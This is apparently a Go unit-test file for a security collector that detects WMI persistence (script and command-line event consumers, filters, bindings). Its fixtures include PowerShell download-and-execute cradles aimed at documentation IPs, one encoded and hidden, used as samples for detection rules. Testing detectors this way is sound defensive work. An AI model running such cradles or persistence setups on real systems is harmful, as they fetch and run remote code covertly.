package collector

import "testing"

func TestJudgeWMIConsumerBenign(t *testing.T) {
	scm := wmiConsumer{Namespace: `root\subscription`, Class: wmiNTEventLog, Name: "SCM Event Log Consumer"}
	if got := judgeWMIConsumer(scm); len(got) != 0 {
		t.Errorf("SCM Event Log Consumer should be benign, got %v", keys(rulesOf(got)))
	}
}

func TestJudgeWMIConsumerFindings(t *testing.T) {
	cases := []struct {
		name string
		c    wmiConsumer
		want []string
	}{
		{"active script",
			wmiConsumer{Namespace: `root\subscription`, Class: wmiActiveScript, Name: "ASEC", ScriptingEngine: "VBScript",
				ScriptText: `Set o = CreateObject("WScript.Shell")`},
			[]string{"persistence.wmi_script_consumer"}},
		{"active script download cradle -> exec rule too",
			wmiConsumer{Namespace: `root\subscription`, Class: wmiActiveScript, Name: "ASEC2", ScriptingEngine: "JScript",
				ScriptText: `IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.1/x')`},
			[]string{"persistence.wmi_script_consumer", "exec.download_execute"}},
		{"command line, normal path",
			wmiConsumer{Namespace: `root\subscription`, Class: wmiCommandLine, Name: "CLEC",
				CommandLineTemplate: `"C:\Program Files\App\agent.exe" --run`},
			[]string{"persistence.wmi_commandline_consumer"}},
		{"command line from temp",
			wmiConsumer{Namespace: `root\subscription`, Class: wmiCommandLine, Name: "CLEC2",
				CommandLineTemplate: `C:\Windows\Temp\evil.exe`},
			[]string{"persistence.wmi_commandline_consumer", "persistence.wmi_consumer_unusual_path"}},
		{"command line encoded powershell",
			wmiConsumer{Namespace: `root\subscription`, Class: wmiCommandLine, Name: "CLEC3",
				CommandLineTemplate: `powershell -nop -w hidden -enc ` + psEncode("IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.2/y')")},
			[]string{"persistence.wmi_commandline_consumer", "exec.powershell_encoded"}},
		{"other consumer class",
			wmiConsumer{Namespace: `root\subscription`, Class: "LogFileEventConsumer", Name: "LFEC", Extra: "writes C:\\logs\\x.log"},
			[]string{"persistence.wmi_consumer"}},
	}
	for _, c := range cases {
		got := rulesOf(judgeWMIConsumer(c.c))
		for _, w := range c.want {
			if _, ok := got[w]; !ok {
				t.Errorf("%s: %s missing (got %v)", c.name, w, keys(got))
			}
		}
	}
}

func TestJudgeWMIFilter(t *testing.T) {
	f := wmiFilter{Namespace: `root\subscription`, Name: "FilterA",
		Query: `SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'`}
	got := rulesOf(judgeWMIFilter(f))
	if _, ok := got["persistence.wmi_filter"]; !ok {
		t.Errorf("wmi_filter missing (got %v)", keys(got))
	}
}

func TestJudgeWMIBinding(t *testing.T) {
	script := &wmiConsumer{Class: wmiActiveScript, Name: "ASEC"}
	cmd := &wmiConsumer{Class: wmiCommandLine, Name: "CLEC"}
	benign := &wmiConsumer{Class: wmiNTEventLog, Name: "SCM Event Log Consumer"}

	b := wmiBinding{Namespace: `root\subscription`, Filter: `__EventFilter.Name="F"`, Consumer: `ActiveScriptEventConsumer.Name="ASEC"`}
	got := rulesOf(judgeWMIBinding(b, script))
	f, ok := got["persistence.wmi_subscription_active"]
	if !ok {
		t.Fatalf("wmi_subscription_active missing (got %v)", keys(got))
	}
	if f.Severity != SevCritical {
		t.Errorf("binding to a script consumer should be critical, got %s", f.Severity)
	}

	if got := judgeWMIBinding(b, cmd); rulesOf(got)["persistence.wmi_subscription_active"].Severity != SevSuspect {
		t.Errorf("binding to a command-line consumer should be suspect")
	}

	if got := judgeWMIBinding(b, benign); len(got) != 0 {
		t.Errorf("binding to the benign SCM consumer should raise nothing, got %v", keys(rulesOf(got)))
	}
}

func TestParseWMIRef(t *testing.T) {
	cases := []struct{ in, class, name string }{
		{`ActiveScriptEventConsumer.Name="evil"`, "ActiveScriptEventConsumer", "evil"},
		{`\\.\root\subscription:CommandLineEventConsumer.Name="x y"`, "CommandLineEventConsumer", "x y"},
		{`__EventFilter.Name="FilterA"`, "__EventFilter", "FilterA"},
		{`CommandLineEventConsumer`, "CommandLineEventConsumer", ""},
	}
	for _, c := range cases {
		class, name := parseWMIRef(c.in)
		if class != c.class || name != c.name {
			t.Errorf("parseWMIRef(%q) = (%q,%q), want (%q,%q)", c.in, class, name, c.class, c.name)
		}
	}
}
